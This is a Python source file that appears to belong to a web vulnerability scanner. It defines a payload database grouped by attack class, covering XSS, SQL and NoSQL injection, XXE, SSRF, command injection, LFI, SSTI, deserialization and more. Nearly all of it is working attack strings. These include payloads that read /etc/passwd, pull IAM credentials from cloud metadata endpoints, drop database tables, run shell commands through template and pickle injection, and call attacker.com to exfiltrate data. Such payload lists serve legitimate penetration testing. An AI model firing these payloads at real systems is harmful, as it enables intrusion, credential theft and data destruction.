"""
Comprehensive Payload Database for Vulnerability Testing
Organized by attack category with proven real-world payloads
"""


class PayloadDatabase:
    """
    Centralized payload database with categorized attack vectors
    """

    # ==================== XSS PAYLOADS ====================
    XSS_PAYLOADS = [
        # Basic XSS
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',

        # Advanced XSS
        '<img src=x onerror="&#97;lert(1)">',
        '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
        '<marquee onstart=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<video><source onerror="alert(1)">',

        # Bypass filters
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<img src="x" onerror="eval(atob("YWxlcnQoMSk="))">',  # alert(1) base64
        '<svg/onload=alert&#40;1&#41;>',
        '<<script>alert(1)//<</script>',
        '<script>alert(1)</script><!--',

        # Modern XSS
        '<input autofocus onfocus=alert(1)>',
        '<select autofocus onfocus=alert(1)>',
        '<textarea autofocus onfocus=alert(1)>',
        '<keygen autofocus onfocus=alert(1)>',

        # DOM XSS
        '#<img src=x onerror=alert(1)>',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',

        # AngularJS XSS
        '{{constructor.constructor("alert(1)")()}}',
        '{{7*7}}',
        '{{$on.constructor("alert(1)")()}}',

        # React XSS
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',

        # Polyglot XSS
        'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e',  # noqa: E501
    ]

    # ==================== SQL INJECTION PAYLOADS ====================
    SQL_INJECTION_PAYLOADS = [
        # Basic SQLi
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 'a'='a",
        "admin' --",
        "admin' #",
        "admin'/*",

        # Union-based SQLi
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION ALL SELECT NULL--",

        # Boolean-based blind SQLi
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND SLEEP(5)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",

        # Time-based blind SQLi
        "'; WAITFOR DELAY '00:00:05'--",
        "'; SELECT SLEEP(5)--",
        "'; BENCHMARK(5000000,MD5('test'))--",

        # Error-based SQLi
        "' AND extractvalue(1,concat(0x7e,database()))--",
        "' AND updatexml(1,concat(0x7e,database()),1)--",
        "' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(database(),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",  # noqa: E501

        # Stacked queries
        "'; DROP TABLE users--",
        "'; INSERT INTO users VALUES(1,'hacked')--",

        # Advanced SQLi
        "' OR (SELECT COUNT(*) FROM users) > 0--",
        "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
        "' OR ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 64--",

        # WAF bypass
        "' /*!50000OR*/ 1=1--",
        "' %0aOR%0a 1=1--",
        "' /**/OR/**/1=1--",
        "' OR/**_**/1=1--",
        "'||'1'='1",

        # NoSQL injection
        "' || '1'=='1",
        "' || 1==1//",
        '{"$gt":""}',
        '{"$ne":null}',
        '{"username":{"$ne":null},"password":{"$ne":null}}',
    ]

    # ==================== XXE PAYLOADS ====================
    XXE_PAYLOADS = [
        # Basic XXE
        '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>''',

        # XXE with parameter entity
        '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
<foo>test</foo>''',

        # Blind XXE with OOB
        '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
<foo>test</foo>''',

        # XXE to read files
        '''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<root>&xxe;</root>''',

        # XXE SSRF
        '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>''',

        # XXE with UTF-16
        '''<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>''',
    ]

    # ==================== SSRF PAYLOADS ====================
    SSRF_PAYLOADS = [
        # AWS metadata
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'http://169.254.169.254/latest/user-data',

        # Google Cloud metadata
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',

        # Azure metadata
        'http://169.254.169.254/metadata/instance?api-version=2021-02-01',

        # Local file access
        'file:///etc/passwd',
        'file:///c:/windows/win.ini',

        # Internal network
        'http://localhost',
        'http://127.0.0.1',
        'http://0.0.0.0',
        'http://[::1]',
        'http://127.1',
        'http://2130706433',  # Decimal IP

        # Bypass filters
        'http://127.0.0.1.nip.io',
        'http://127.0.0.1.xip.io',
        'http://[::]:80/',
        'http://0177.0.0.1',  # Octal
        'http://0x7f.0x0.0x0.0x1',  # Hex
    ]

    # ==================== COMMAND INJECTION PAYLOADS ====================
    COMMAND_INJECTION_PAYLOADS = [
        # Basic command injection
        '; ls',
        '| ls',
        '& ls',
        '&& ls',
        '|| ls',
        '` ls `',
        '$( ls )',

        # With common commands
        '; whoami',
        '| whoami',
        '; id',
        '; cat /etc/passwd',
        '; curl http://attacker.com',
        '; wget http://attacker.com',

        # Time-based detection
        '; sleep 5',
        '| sleep 5',
        '; ping -c 5 127.0.0.1',

        # Bypass filters
        ';w\\ho\\am\\i',
        ';${IFS}whoami',
        ';who$()ami',
        ';who$@ami',
        ';\x77hoami',

        # Windows
        '& dir',
        '| dir',
        '& type C:\\Windows\\win.ini',
        '| type C:\\Windows\\win.ini',
    ]

    # ==================== LFI PAYLOADS ====================
    LFI_PAYLOADS = [
        # Basic LFI
        '../../../etc/passwd',
        '..\\..\\..\\windows\\win.ini',

        # Deep traversal
        '../' * 10 + 'etc/passwd',
        '..\\' * 10 + 'windows\\win.ini',

        # Null byte (PHP < 5.3)
        '../../../etc/passwd%00',
        '../../../etc/passwd%00.jpg',

        # URL encoding
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',

        # Double encoding
        '..%252f..%252f..%252fetc%252fpasswd',

        # UTF-8 encoding
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',

        # Common files
        '/etc/passwd',
        '/etc/shadow',
        '/etc/hostname',
        '/proc/self/environ',
        '/proc/self/cmdline',
        'C:\\Windows\\win.ini',
        'C:\\boot.ini',

        # Log poisoning
        '/var/log/apache2/access.log',
        '/var/log/nginx/access.log',
        '/var/log/auth.log',
    ]

    # ==================== SSTI PAYLOADS ====================
    SSTI_PAYLOADS = [
        # Jinja2
        '{{7*7}}',
        '{{config}}',
        '{{self}}',
        '{{request}}',
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}",

        # Twig
        '{{7*7}}',
        '{{_self}}',
        '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}',

        # Freemarker
        '${7*7}',
        '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("whoami") }',

        # Velocity
        '#set($str=$class.inspect("java.lang.String").type)',
        '#set($chr=$class.inspect("java.lang.Character").type)',

        # Smarty
        '{$smarty.version}',
        '{php}echo `whoami`;{/php}',

        # Mako
        '${7*7}',
        '<%import os%>${os.system("whoami")}',
    ]

    # ==================== XPATH INJECTION PAYLOADS ====================
    XPATH_INJECTION_PAYLOADS = [
        "' or '1'='1",
        "' or 1=1 or '1'='1",
        "x' or 1=1 or 'x'='y",
        "admin' or '1'='1",
        "' or count(parent::*)=1 or '1'='2",
        "' or name()='username' or '1'='2",
        "' or string-length(name())>0 or '1'='2",
    ]

    # ==================== LDAP INJECTION PAYLOADS ====================
    LDAP_INJECTION_PAYLOADS = [
        '*',
        '*)(&',
        '*)(uid=*))(|(uid=*',
        'admin)(&(password=*))',
        '*)(objectClass=*',
        '*))(|(cn=*',
    ]

    # ==================== CRLF INJECTION PAYLOADS ====================
    CRLF_INJECTION_PAYLOADS = [
        '%0d%0aSet-Cookie: admin=true',
        '%0d%0aLocation: http://attacker.com',
        '%0aSet-Cookie: admin=true',
        '%0d%0a%0d%0a<script>alert(1)</script>',
        '\r\nSet-Cookie: admin=true',
        '\nSet-Cookie: admin=true',
    ]

    # ==================== OPEN REDIRECT PAYLOADS ====================
    OPEN_REDIRECT_PAYLOADS = [
        '//evil.com',
        '///evil.com',
        '////evil.com',
        'https://evil.com',
        '//google.com',
        '/\\evil.com',
        '/.evil.com',
        'http://evil.com',
        'https:evil.com',
        '//evil%E3%80%82com',
        '/redirector?url=https://evil.com',
        'javascript:alert(1)',
    ]

    # ==================== PROTOTYPE POLLUTION PAYLOADS ====================
    PROTOTYPE_POLLUTION_PAYLOADS = [
        '__proto__[admin]=true',
        'constructor[prototype][admin]=true',
        '__proto__.admin=true',
        'constructor.prototype.admin=true',
        '__proto__[isAdmin]=1',
    ]

    # ==================== JWT PAYLOADS ====================
    JWT_PAYLOADS = [
        # Algorithm confusion
        'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.',  # alg: none

        # Weak secrets
        'secret',
        'password',
        '123456',
        'qwerty',
        '',
    ]

    # ==================== GRAPHQL PAYLOADS ====================
    GRAPHQL_PAYLOADS = [
        # Introspection
        '{"query":"{ __schema { types { name } } }"}',
        '{"query":"{ __type(name: \\"Query\\") { fields { name } } }"}',

        # Batching
        '[{"query":"{ user(id: 1) { name } }"},{"query":"{ user(id: 2) { name } }"}]',

        # Depth attack
        '{"query":"{ user { friends { friends { friends { friends { name } } } } } }"}',
    ]

    # ==================== NOSQL INJECTION PAYLOADS ====================
    NOSQL_INJECTION_PAYLOADS = [
        # MongoDB
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$regex": ".*"}',
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"username": {"$gt": ""}, "password": {"$gt": ""}}',

        # Blind NoSQL
        '{"username": "admin", "password": {"$regex": "^a"}}',
        '{"username": "admin", "password": {"$regex": "^b"}}',
    ]

    # ==================== DESERIALIZATION PAYLOADS ====================
    DESERIALIZATION_PAYLOADS = [
        # Java
        'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5jb21wYXJhdG9ycy5UcmFuc2Zvcm1pbmdDb21wYXJhdG9yL/',  # noqa: E501

        # Python pickle
        "cos\nsystem\n(S'whoami'\ntR.",

        # PHP
        'O:8:"stdClass":1:{s:4:"test";s:6:"hacked";}',
    ]

    # ==================== XXE REAL-WORLD PAYLOADS ====================
    XXE_REAL_WORLD = [
        # AWS metadata extraction
        '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY aws SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<foo>&aws;</foo>''',

        # File exfiltration via DTD
        '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd" >
%dtd;]>
<foo>&send;</foo>''',
    ]

    @classmethod
    def get_payloads_by_category(cls, category: str):
        """Get payloads for specific vulnerability category"""
        category_map = {
            'xss': cls.XSS_PAYLOADS,
            'sql': cls.SQL_INJECTION_PAYLOADS,
            'xxe': cls.XXE_PAYLOADS,
            'ssrf': cls.SSRF_PAYLOADS,
            'command': cls.COMMAND_INJECTION_PAYLOADS,
            'lfi': cls.LFI_PAYLOADS,
            'ssti': cls.SSTI_PAYLOADS,
            'xpath': cls.XPATH_INJECTION_PAYLOADS,
            'ldap': cls.LDAP_INJECTION_PAYLOADS,
            'crlf': cls.CRLF_INJECTION_PAYLOADS,
            'redirect': cls.OPEN_REDIRECT_PAYLOADS,
            'prototype': cls.PROTOTYPE_POLLUTION_PAYLOADS,
            'jwt': cls.JWT_PAYLOADS,
            'graphql': cls.GRAPHQL_PAYLOADS,
            'nosql': cls.NOSQL_INJECTION_PAYLOADS,
            'deserialization': cls.DESERIALIZATION_PAYLOADS,
        }
        return category_map.get(category.lower(), [])

    @classmethod
    def get_all_categories(cls):
        """Get list of all available payload categories"""
        return [
            'xss', 'sql', 'xxe', 'ssrf', 'command', 'lfi', 'ssti',
            'xpath', 'ldap', 'crlf', 'redirect', 'prototype', 'jwt',
            'graphql', 'nosql', 'deserialization'
        ]


# Quick access functions
def get_xss_payloads():
    return PayloadDatabase.XSS_PAYLOADS


def get_sql_payloads():
    return PayloadDatabase.SQL_INJECTION_PAYLOADS


def get_xxe_payloads():
    return PayloadDatabase.XXE_PAYLOADS


def get_ssrf_payloads():
    return PayloadDatabase.SSRF_PAYLOADS


def get_all_payloads():
    """Get all payloads as a dictionary"""
    return {
        'xss': PayloadDatabase.XSS_PAYLOADS,
        'sql': PayloadDatabase.SQL_INJECTION_PAYLOADS,
        'xxe': PayloadDatabase.XXE_PAYLOADS,
        'ssrf': PayloadDatabase.SSRF_PAYLOADS,
        'command': PayloadDatabase.COMMAND_INJECTION_PAYLOADS,
        'lfi': PayloadDatabase.LFI_PAYLOADS,
        'ssti': PayloadDatabase.SSTI_PAYLOADS,
        'xpath': PayloadDatabase.XPATH_INJECTION_PAYLOADS,
        'ldap': PayloadDatabase.LDAP_INJECTION_PAYLOADS,
        'crlf': PayloadDatabase.CRLF_INJECTION_PAYLOADS,
        'redirect': PayloadDatabase.OPEN_REDIRECT_PAYLOADS,
        'prototype': PayloadDatabase.PROTOTYPE_POLLUTION_PAYLOADS,
        'jwt': PayloadDatabase.JWT_PAYLOADS,
        'graphql': PayloadDatabase.GRAPHQL_PAYLOADS,
        'nosql': PayloadDatabase.NOSQL_INJECTION_PAYLOADS,
        'deserialization': PayloadDatabase.DESERIALIZATION_PAYLOADS,
    }
